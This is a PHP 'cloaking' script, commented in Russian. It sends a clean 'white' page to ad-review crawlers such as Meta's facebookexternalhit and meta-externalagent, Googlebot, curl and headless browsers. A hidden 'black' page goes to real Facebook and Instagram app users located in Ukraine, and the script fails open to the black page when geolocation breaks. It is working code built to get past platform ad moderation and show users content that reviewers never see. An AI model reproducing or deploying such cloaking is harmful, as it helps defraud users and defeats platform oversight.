<?php
/**
 * Серверная клоака + гео (FB-safe).
 *
 * Приоритет: не резать живых пользователей Facebook/Instagram.
 *   - in-app UA (FBAN/FBAV/Instagram) → никогда не white
 *   - гео не определилось → пускаем на black (fail-open)
 *   - white только явным crawler UA
 */

declare(strict_types=1);

const ALLOWED_COUNTRIES = ['UA'];
const BLOCK_ACTION = 'stub'; // stub | redirect
const BLOCK_REDIRECT = 'https://www.google.com/';
const BLACK_FILE = __DIR__ . '/black.html';
const WHITE_FILE = __DIR__ . '/white.html';
const ALLOW_LOCALHOST = false;
const GEO_FAIL_OPEN = true; // не определили страну → пустить
const PREFER_USER_SAFETY = true;

function clientIp(): string
{
    foreach (['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'] as $key) {
        if (empty($_SERVER[$key])) {
            continue;
        }
        $part = trim(explode(',', (string) $_SERVER[$key])[0]);
        if (filter_var($part, FILTER_VALIDATE_IP)) {
            return $part;
        }
    }
    return '0.0.0.0';
}

function isLocalIp(string $ip): bool
{
    return in_array($ip, ['127.0.0.1', '::1', '0.0.0.0'], true);
}

function isFacebookUserTraffic(?string $ua, ?string $ref): bool
{
    $ua = strtolower((string) $ua);
    $ref = strtolower((string) $ref);

    foreach (['fban', 'fbav', 'fb_iab', 'fbios', 'fb4a', 'fbiab', 'instagram', 'messenger'] as $token) {
        if (str_contains($ua, $token)) {
            return true;
        }
    }

    foreach (['facebook.com', 'fb.com', 'fb.me', 'instagram.com', 'l.facebook.com', 'lm.facebook.com', 'm.facebook.com'] as $host) {
        if (str_contains($ref, $host)) {
            return true;
        }
    }

    return false;
}

function isKnownCrawler(?string $ua): bool
{
    $ua = strtolower((string) $ua);
    if ($ua === '') {
        return PREFER_USER_SAFETY ? false : true;
    }

    // Только явные crawler/preview боты Meta — НЕ in-app
    $needles = [
        'googlebot', 'adsbot-google', 'mediapartners-google', 'google-inspectiontool',
        'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 'yandexbot', 'applebot', 'petalbot',
        'facebookexternalhit', 'facebot', 'facebookcatalog',
        'meta-externalagent', 'meta-externalfetcher',
        'twitterbot', 'linkedinbot', 'embedly', 'quora link preview', 'skypeuripreview',
        'slackbot-linkexpanding', 'discordbot',
        'semrushbot', 'ahrefsbot', 'mj12bot', 'dotbot', 'rogerbot', 'screaming frog',
        'bytespider', 'gptbot', 'ccbot',
        'curl/', 'wget/', 'python-requests', 'python-urllib', 'scrapy',
        'headlesschrome', 'phantomjs', 'puppeteer', 'playwright', 'selenium', 'chrome-lighthouse',
    ];

    foreach ($needles as $n) {
        if (str_contains($ua, $n)) {
            return true;
        }
    }
    return false;
}

function countryFromCloudflare(): ?string
{
    if (!empty($_SERVER['HTTP_CF_IPCOUNTRY'])) {
        $c = strtoupper(trim((string) $_SERVER['HTTP_CF_IPCOUNTRY']));
        if ($c !== '' && $c !== 'XX' && strlen($c) === 2) {
            return $c;
        }
    }
    return null;
}

function countryFromApi(string $ip): ?string
{
    if (isLocalIp($ip)) {
        return 'UA';
    }

    $url = 'https://ipapi.co/' . rawurlencode($ip) . '/country/';
    $ctx = stream_context_create([
        'http' => [
            'timeout' => 2.5,
            'header' => "User-Agent: raif-cloak\r\n",
        ],
    ]);
    $raw = @file_get_contents($url, false, $ctx);
    if ($raw === false) {
        return null;
    }
    $c = strtoupper(trim($raw));
    return (strlen($c) === 2) ? $c : null;
}

function serveFile(string $path, int $code = 200): void
{
    if (!is_file($path)) {
        http_response_code(500);
        header('Content-Type: text/plain; charset=utf-8');
        echo basename($path) . " not found";
        exit;
    }
    http_response_code($code);
    header('Content-Type: text/html; charset=utf-8');
    readfile($path);
    exit;
}

function renderStub(): void
{
    http_response_code(403);
    header('Content-Type: text/html; charset=utf-8');
    echo '<!DOCTYPE html><html lang="uk"><head><meta charset="UTF-8">'
        . '<meta name="viewport" content="width=device-width, initial-scale=1">'
        . '<meta name="robots" content="noindex,nofollow">'
        . '<title>Сервіс недоступний</title>'
        . '<style>body{margin:0;min-height:100vh;display:grid;place-items:center;'
        . 'background:#070707;color:#fff;font-family:system-ui,sans-serif}'
        . '.c{max-width:420px;padding:2rem;text-align:center}'
        . 'h1{font-size:1.4rem;margin:0 0 .75rem}p{color:#bbb;line-height:1.45}</style>'
        . '</head><body><div class="c"><h1>Сервіс недоступний</h1>'
        . '<p>Ця пропозиція доступна лише для користувачів з України.</p></div></body></html>';
    exit;
}

$view = isset($_GET['view']) ? strtolower((string) $_GET['view']) : '';
if ($view === 'white') {
    serveFile(WHITE_FILE);
}
if ($view === 'black') {
    serveFile(BLACK_FILE);
}

$ip = clientIp();
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
$ref = $_SERVER['HTTP_REFERER'] ?? '';

// Живой FB/IG — сразу к гео, white не отдаём
$isFbUser = isFacebookUserTraffic($ua, $ref);

if (!$isFbUser && isKnownCrawler($ua) && !(ALLOW_LOCALHOST && isLocalIp($ip))) {
    header('X-Cloak: white');
    serveFile(WHITE_FILE);
}

$country = countryFromCloudflare();
if ($country === null) {
    $country = countryFromApi($ip);
}

if ($country === null) {
    // Гео упало — не режем людей
    if (GEO_FAIL_OPEN) {
        header('X-Cloak: black');
        header('X-Geo-Country: unknown-failopen');
        serveFile(BLACK_FILE);
    }
    renderStub();
}

$allowed = in_array($country, ALLOWED_COUNTRIES, true);
if (!$allowed) {
    header('X-Cloak: geo-block');
    if (BLOCK_ACTION === 'redirect') {
        header('Location: ' . BLOCK_REDIRECT, true, 302);
        exit;
    }
    renderStub();
}

header('X-Cloak: black');
header('X-Geo-Country: ' . $country);
serveFile(BLACK_FILE);
